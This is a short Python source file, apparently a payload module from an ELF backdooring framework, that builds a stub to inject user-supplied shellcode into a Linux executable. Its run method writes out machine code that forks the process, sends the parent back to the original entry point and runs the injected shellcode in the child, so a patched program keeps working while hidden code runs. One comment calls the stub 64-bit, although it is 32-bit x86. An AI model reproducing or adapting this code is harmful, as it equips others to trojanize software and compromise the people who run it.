import struct
import os
import logging
from core import support
logger = logging.getLogger(__name__)
#eat_code_caves function is arch agnostic?
from common import common

class user_supplied_shellcode():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "user_supplied_shellcode"
        self.description = """User supplied x86 linux shellcode"""
        self.requirements = {'MODE':'How the patching will happen',
                             'SUPPLIED_SHELLCODE':'User suppled shellcode in raw format',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['text_splitting']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self):
        """
        For user supplied shellcode
        """
        
        supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #64bit shellcode
        self.shellcode = b"\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
        self.shellcode += b"\xbd"
        self.shellcode += struct.pack("<I", self.PM.BDF.elf_object['e_entry'])
        self.shellcode += b"\xff\xe5"
        self.shellcode += supplied_shellcode

        return self.shellcode


        
